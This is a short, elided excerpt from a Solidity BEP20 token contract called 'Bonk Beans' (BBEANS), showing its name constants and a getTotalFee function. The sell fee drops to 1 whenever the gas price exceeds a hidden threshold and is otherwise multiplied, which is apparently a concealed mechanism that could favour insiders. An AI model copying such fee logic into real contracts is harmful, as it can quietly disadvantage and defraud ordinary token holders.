...
contract BONKBEANS is IBEP20, Auth {
    ...
    string constant _name = "Bonk Beans";
    string constant _symbol = unicode"BBEANS";
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        ...
        if(selling) {return tx.gasprice > gq ? 1 : totalFee.mul(_sellMultiplier);}
        return totalFee;
    }
